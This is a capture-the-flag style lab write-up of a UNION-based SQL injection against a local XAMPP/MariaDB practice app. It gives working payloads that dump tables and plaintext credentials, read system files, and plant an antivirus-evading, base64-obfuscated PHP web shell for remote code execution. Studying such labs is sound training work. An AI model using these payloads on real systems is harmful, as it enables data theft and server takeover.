### **Lab - 0x04**



**Detection Payload:**
1. Used backslash `\` to check whether our input treated as int string (single or double) or within `()`.
2. Got error messages, ` You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\") LIMIT 0,1' at line 1 `.
3. `-1") or 1=1--+` (showed entry for id 1 because 1=1 is true)
4. `-1") or 1=2--+` (didn't show entry, because 1=2 is false)


---



**Total columns**:

1. `-1") order by 10--+` (showed `Unknown column '10' in 'order clause'`)
2. `-1") order by 5--+` (showed `Unknown column '5' in 'order clause'`)
3. Tried with lower, `-1") order by 2--+` (no output, means there are atleast 2 columns returning in the select sql query)
4. Tried with 3, `-1") order by 3--+` (same behavior)
5. Tried with 4, `-1") order by 4--+` (showed  `Unknown column '4' in 'order clause'`)
6. This confirmed, there are only 3 columns retuning in the sql query.

---



**Vulnerable columns**:

1. `-1") union select 1,2,3--+` (returned 2 and 3)
2. This confirmed, vulnerable columns are 2 and 3.

**----------------------------------------------------------------------------------**



**Database** - security { SQLi Payload: `-1") union select 0x00,database(),0x00--+` }

**Version** - 10.1.38-MariaDB { SQLi Payload: `-1") union select 0x00,version(),0x00--+` }

**User** - root@localhost { SQLi Payload: `-1") union select 0x00,user(),0x00--+` }

**Full String** - root@localhost, 10.1.38-MariaDB, security { SQLi Payload: `-1") union select 0x00, concat_ws(", ", user(), version(), database()), 0x00--+` }

**----------------------------------------------------------------------------------**



**Tables**:

1. Now, the next step was to find the tables from the database.
2. Hence, I used the payload `-1") union select 0x00, group_concat(table_name SEPARATOR 0x2c20), 0x00 from information_schema.tables where table_schema=database()--+`
3. Got the following table names - `emails, referers, uagents, users`


**----------------------------------------------------------------------------------**



**Colums:**
1. Now we can extract the column names of each table.
2. I used query `-1") union select 0x00, group_concat(column_name SEPARATOR 0x2c20), 0x00 from information_schema.columns where table_name='emails'--+` to get the column names.
3. For each table, I change the name of the table.

**emails** - `id, email_id`

**referers** - `id, referer, ip_address`

**uagents** - `id, uagent, ip_address, username`

**users** - `USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS, id, username, password`



**----------------------------------------------------------------------------------**



**Rows:**



1. Now the final step is to get the rows or data inside those tables.
2. Since we have the column names, we can easily get the information from each table.
3. Payload used for users table, `-1") union select 0x00,group_concat(concat(username, ":", password)),0x00 from users--+`.
4. Pulled data from each tables by changing the column names and table name.

**users :-**

`Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4`



**emails :-**

`1:Dumb@dhakkan.com,2:Angel@iloveu.com,3:Dummy@dhakkan.local,4:secure@dhakkan.local,5:stupid@dhakkan.local,6:superman@dhakkan.local,7:batman@dhakkan.local,8:admin@dhakkan.com`

**----------------------------------------------------------------------------------**


**Reverse Shell:**

1. We have the information, but, can we escalate to get a reverse shell on the server? Sure we can.
2. But first, I have to check do we have permission to use `load_file` function and if yes, we need to get the base directory of the MySQL installation.
3. I did that using the following payload, `-1") union select 0x00,(SELECT @@basedir),0x00--+`, Got the output: `C:/xampp/mysql`.
4. Also, got the directory where the databases and tables are stored using `-1") union select 0x00,(SELECT @@datadir),0x00--+` -> `C:\\xampp\\mysql\\data\\`
5. Now, I know it is an windows OS, and we have enough information about the file system, we can use load\_file to read a host file to check if we have permission to do so.
6. So I used, `-1") UNION SELECT 0x00, (SELECT LOAD_FILE('C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts') AS Result), 0x00 FROM users--+` to get the host file content.
7. Now, we need to write to a php file to get a reverse shell.



So, I used the following PHP code to get a reverse shell:

```php
<?php system($_GET['cmd']); ?>
```



Converted the code into ASCII and got:

```text
60 63 112 104 112 32 115 121 115 116 101 109 40 36 95 71 69 84 91 39 99 109 100 39 93 41 59 32 63 62
```

Then used JS to convert it into the parameters which can be passed to the `CHAR` function in MySQL.

```javascript
'60 63 112 104 112 10 9 115 121 115 116 101 109 40 36 95 71 69 84 91 39 99 109 100 39 93 41 59 10 63 62'.split(' ').join(', ') 
```

Then, finally made the SQLi Payload

```sql
-1") UNION SELECT 0x00, CHAR(60, 63, 112, 104, 112, 10, 9, 115, 121, 115, 116, 101, 109, 40, 36, 95, 71, 69, 84, 91, 39, 99, 109, 100, 39, 93, 41, 59, 10, 63, 62), 0x00 INTO OUTFILE 'C:\\\\xampp\\\\htdocs\\\\shell.php'--+
```

I tried to visit `http://localhost/shell.php`, but got `404`, means the file was flaged malicious and deleted by Windows Defender or Antivirus. Then, I changed the PHP code and use obfuscation.

The final PHP code look like this:

```php
<?php eval(base64_decode('CiBlY2hvICJcNzRceDcwXHg3MlwxNDVcNzYiIC4gc2hlbGxfZXhlYygkX0dFVFsiXHg2M1wxNTVceDY0Il0pIC4gIlx4M2NcNTdceDcwXDE2MlwxNDVcNzYiOyA=')); ?>
```

Now, converted the same to ascii text and passed it to the `CHAR` function. Hence, the final SQLi Payload looks like this:
```sql
-1")' UNION SELECT 0x41, CHAR(60, 63, 112, 104, 112, 32, 101, 118, 97, 108, 40, 98, 97, 115, 101, 54, 52, 95, 100, 101, 99, 111, 100, 101, 40, 39, 67, 105, 66, 108, 89, 50, 104, 118, 73, 67, 74, 99, 78, 122, 82, 99, 101, 68, 99, 119, 88, 72, 103, 51, 77, 108, 119, 120, 78, 68, 86, 99, 78, 122, 89, 105, 73, 67, 52, 103, 99, 50, 104, 108, 98, 71, 120, 102, 90, 88, 104, 108, 89, 121, 103, 107, 88, 48, 100, 70, 86, 70, 115, 105, 88, 72, 103, 50, 77, 49, 119, 120, 78, 84, 86, 99, 101, 68, 89, 48, 73, 108, 48, 112, 73, 67, 52, 103, 73, 108, 120, 52, 77, 50, 78, 99, 78, 84, 100, 99, 101, 68, 99, 119, 88, 68, 69, 50, 77, 108, 119, 120, 78, 68, 86, 99, 78, 122, 89, 105, 79, 121, 65, 61, 39, 41, 41, 59, 32, 63, 62), NULL INTO OUTFILE 'C:\\\\xampp\\\\htdocs\\\\shell.php'--+
```

After this, navigated to `http://localhost/shell.php?cmd=cd` and got output `C:\xampp\htdocs` and got `Remote Code Execution` on the server.


Lab Solved.

